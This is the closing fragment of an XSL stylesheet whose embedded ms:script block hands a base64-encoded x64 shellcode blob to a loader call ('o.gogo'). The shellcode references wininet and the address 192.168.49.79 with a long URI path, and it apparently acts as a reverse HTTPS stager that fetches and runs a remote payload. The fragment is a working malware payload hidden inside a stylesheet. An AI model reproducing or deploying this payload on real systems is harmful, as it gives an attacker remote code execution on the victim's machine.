            var sc = "/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgVkiLUhhIi1IgSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A4AAAAxOTIuMTY4LjQ5Ljc5AFpIicFJx8C7AQAATTHJU1NqA1NJuleJn8YAAAAA/9XoYgAAAC9YdWVTbjgyaVhNMDB6elhOVlh1RGlnWWM1cVhSUFpaYy1fSkdWM28zVVBSZTFWQThwZ0VmdERyOS1HT2dkTzBETERxMTQ3TjZhT2tQQWFkdmNuUTI3S19SUXo1b2FTcVAASInBU1pBWE0xyVNIuAAyqIQAAAAAUFNTScfC61UuO//VSInGagpfSInxah9aUmiAMwAASYngagRBWUm6dUaehgAAAAD/1U0xwFNaSInxTTHJTTHJU1NJx8ItBhh7/9WFwHUfSMfBiBMAAEm6RPA14AAAAAD/1Uj/z3QC66roVQAAAFNZakBaSYnRweIQScfAABAAAEm6WKRT5QAAAAD/1UiTU1NIiedIifFIidpJx8AAIAAASYn5SboSloniAAAAAP/VSIPEIIXAdLJmiwdIAcOFwHXSWMNYagBZu+AdKgpBidr/1Q=="
            o.gogo(sc);
        } catch (e) {
            debug(e.message);
        }
        ]]>
    </ms:script>
</stylesheet>